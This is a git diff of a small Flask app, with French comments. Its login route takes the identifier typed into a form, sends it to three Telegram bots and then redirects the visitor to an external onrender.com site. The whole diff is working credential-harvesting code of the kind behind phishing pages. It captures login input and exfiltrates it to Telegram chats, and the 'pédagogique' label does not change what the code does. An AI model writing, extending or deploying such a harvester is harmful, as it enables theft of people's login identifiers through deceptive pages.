@@ -3,47 +3,53 @@ from flask import Flask, render_template, request, redirect
 import os
 import requests
 
-# Chargement manuel du fichier .env
+# Chargement du fichier .env
 dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
 load_dotenv(dotenv_path=dotenv_path)
 
-# Vérification du bon chargement
-print("BOT_TOKEN:", os.getenv("BOT_TOKEN"))
-print("CHAT_ID:", os.getenv("CHAT_ID"))
-
 app = Flask(__name__)
 
+# Récupération des tokens et chat ids des 3 bots
+bots = [
+    {
+        "token": os.getenv("BOT_TOKEN_1"),
+        "chat_id": os.getenv("CHAT_ID_1"),
+    },
+    {
+        "token": os.getenv("BOT_TOKEN_2"),
+        "chat_id": os.getenv("CHAT_ID_2"),
+    },
+    {
+        "token": os.getenv("BOT_TOKEN_3"),
+        "chat_id": os.getenv("CHAT_ID_3"),
+    }
+]
 
-# Chargement des variables d'environnement depuis le fichier .env
-TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("CHAT_ID")
-
-# Vérifie si les variables sont bien chargées
-if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-    raise ValueError("Les variables d'environnement BOT_TOKEN et CHAT_ID ne sont pas définies dans .env")
-
+# Vérification que toutes les variables d'environnement sont présentes
+for i, bot in enumerate(bots, start=1):
+    if not bot["token"] or not bot["chat_id"]:
+        raise ValueError(f"BOT_TOKEN_{i} ou CHAT_ID_{i} non défini dans le fichier .env")
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         identifiant = request.form.get('identifiant')
 
-        if not identifiant:  # Vérifie que l'identifiant a bien été envoyé
-            return "Identifiant manquant", 400  # Retourne une erreur si l'identifiant est vide
+        if not identifiant:
+            return "Identifiant manquant", 400
 
-        # Envoi du message à Telegram
         message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
 
-        # Envoi de la requête POST à Telegram
-        response = requests.post(url, data=payload)
+        # Envoi du message via chaque bot Telegram
+        for bot in bots:
+            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+            payload = {'chat_id': bot['chat_id'], 'text': message}
+            response = requests.post(url, data=payload)
 
-        # Vérification de la réponse pour s'assurer que le message a bien été envoyé
-        if response.status_code != 200:
-            return f"Erreur lors de l'envoi du message Telegram : {response.text}", 500
+            if response.status_code != 200:
+                return f"Erreur lors de l'envoi du message Telegram avec BOT_TOKEN_{bots.index(bot)+1} : {response.text}", 500
 
-        # Redirection vers Google ou autre site
+        # Redirection après succès
         return redirect("https://code-s-curit-qxie.onrender.com/")
 
     return render_template('login.html')
